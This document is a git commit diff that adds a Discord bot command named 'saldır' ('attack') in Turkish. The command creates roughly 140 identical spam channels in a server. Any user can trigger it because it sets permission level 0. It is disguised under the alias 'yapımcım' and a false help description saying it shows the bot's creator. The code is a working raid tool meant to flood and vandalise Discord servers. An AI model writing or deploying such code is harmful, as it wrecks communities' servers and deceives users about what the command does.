0e835decb06b04bc1bdd8a68bd412875dbd611be
Glitch (hello-express) <none>
2019-01-14 20:37:23 +0000

    🌦🎱 Checkpoint ./package.json:2426017/2 ./komutlar/saldırv2.js:2426017/80543 ./komutlar/saldır.js:2426017/86092

---
+++ komutlar/saldır.js
@@ -0,0 +1,152 @@
+const Discord = require('discord.js');
+const ayarlar = require('../ayarlar.json');
+
+var prefix = ayarlar.prefix;
+
+exports.run = (client, message, params) => {
+  const embed = new Discord.RichEmbed()
+  .setDescription('')
+  .setColor(0x00ffff)
+  .addField("GOOG GAME")
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  message.guild.createChannel(`15 TL `);
+  
+  
+};
+
+exports.conf = {
+  enabled: true,
+  guildOnly: false,
+  aliases: ['yapımcım'],
+  permLevel: 0
+};
+
+exports.help = {
+  name: 'saldır',
+  description: 'Botun Yapımcısını Gösterir',
+  usage: 'saldır'
+};
